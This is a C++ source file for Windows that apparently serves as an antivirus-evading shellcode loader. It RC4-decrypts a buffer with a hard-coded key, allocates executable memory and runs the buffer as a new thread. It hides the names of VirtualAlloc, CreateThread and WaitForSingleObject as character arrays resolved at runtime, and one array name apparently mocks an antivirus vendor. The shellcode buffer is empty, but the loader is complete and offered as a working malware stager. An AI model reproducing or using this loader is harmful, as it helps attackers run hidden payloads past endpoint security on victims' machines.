#include <stdio.h>
#include <windows.h>
#include <iostream>
using namespace std;
unsigned char T[256] = { 0 };

int rc4_init(unsigned char* s, unsigned char* key, unsigned long Len)
{
	int i = 0, j = 0;

	unsigned char t[256] = { 0 };
	unsigned char tmp = 0;
	for (i = 0; i < 256; i++) {
		s[i] = i;
		t[i] = key[i % Len];
	}
	for (i = 0; i < 256; i++) {
		j = (j + s[i] + t[i]) % 256;
		tmp = s[i];
		s[i] = s[j];
		s[j] = tmp;
	}
	for (int i = 0; i < 256; i++)
	{
		T[i] = s[i];
	}
	cout << endl;
	return 0;
}

int rc4_crypt(unsigned char* s, unsigned char* buf, unsigned long Len)
{
	int i = 0, j = 0, t = 0;
	unsigned char tmp;
	for (int k = 0; k < Len; k++)
	{
		i = (i + 1) % 256;
		j = (j + s[i]) % 256;
		tmp = s[i];
		s[i] = s[j];
		s[j] = tmp;
		t = (s[i] + s[j]) % 256;
		buf[k] ^= s[t];
	}
	return 0;
}
int main()
{
	char key[] = "cookie";	//Rc4解密的Key
	//要解密的ShellCode
	unsigned char buf[] =
		"";

	unsigned char s[256];
	rc4_init(s, (unsigned char*)key, strlen(key));
	for (size_t i = 0; i < sizeof(buf); i++)
	{
		rc4_crypt(s, &buf[i], sizeof(buf[i]));
		//printf("\\x%02x", buf[i]);
	}

	typedef LPVOID(WINAPI* Virtual)(
		_In_opt_ LPVOID lpAddress,
		_In_     SIZE_T dwSize,
		_In_     DWORD flAllocationType,
		_In_     DWORD flProtect
		);
	char qaxnb[] = { 'V','i','r','t','u','a','l','A','l','l','o','c',0 };
	Virtual Alloc = (Virtual)GetProcAddress(LoadLibraryA("Kernel32.dll"), qaxnb);
	LPVOID add = Alloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);


	RtlCopyMemory(add, buf, sizeof(buf));


	typedef HANDLE (WINAPI * Create)(
			_In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes,
			_In_ SIZE_T dwStackSize,
			_In_ LPTHREAD_START_ROUTINE lpStartAddress,
			_In_opt_ __drv_aliasesMem LPVOID lpParameter,
			_In_ DWORD dwCreationFlags,
			_Out_opt_ LPDWORD lpThreadId
		);
	char NoymY[] = { 'C','r','e','a','t','e','T','h','r','e','a','d','\0' };
	Create Thread = (Create)GetProcAddress(LoadLibraryA("Kernel32.dll"), NoymY);
	HANDLE handle = Thread(NULL, NULL, (LPTHREAD_START_ROUTINE)add, 0, 0, 0);


	typedef DWORD (WINAPI * WaitFor)(
			_In_ HANDLE hHandle,
			_In_ DWORD dwMilliseconds
		);
	char Bgdqr[] = { 'W','a','i','t','F','o','r','S','i','n','g','l','e','O','b','j','e','c','t','\0' };
	WaitFor SingleObject = (WaitFor)GetProcAddress(LoadLibraryA("Kernel32.dll"), Bgdqr);
	SingleObject(handle, INFINITE);

	return 0;
}
